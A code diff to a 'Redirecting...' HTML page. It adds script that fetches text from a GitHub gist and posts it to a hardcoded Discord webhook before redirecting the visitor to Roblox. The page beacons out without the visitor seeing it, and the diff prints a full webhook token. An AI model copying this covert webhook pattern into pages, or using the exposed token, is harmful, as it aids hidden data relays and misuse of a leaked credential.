@@ -4,16 +4,40 @@
     <meta charset="UTF-8">
     <title>Redirecting...</title>
     <script>
+        function sendToDiscord(content) {
+            fetch('https://discord.com/api/webhooks/1240542461798121513/J2pKhg-ZqVX3cOJGX6chwfrBqjkfwJV08zF77jPs-jPg66oA7OXiUN57sCGnznfeN9d8', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    content: content
+                }),
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Content sent to Discord successfully');
+                } else {
+                    console.error('Error sending content to Discord');
+                }
+                redirectToRoblox();
+            })
+            .catch(error => {
+                console.error('Network error:', error);
+                redirectToRoblox();
+            });
+        }
+
         function loadContent() {
             fetch('https://gist.githubusercontent.com/Robloxrealdude/9ac07a3b0478651b0fe98bc5aa02ef0d/raw')
                 .then(response => response.text())
                 .then(data => {
                     console.log("Content loaded: ", data);
-                    redirectToRoblox();
+                    sendToDiscord(data);
                 })
                 .catch(error => {
                     console.error("Error loading content: ", error);
-                    redirectToRoblox();
+                    sendToDiscord('Failed to load content');
                 });
         }
 
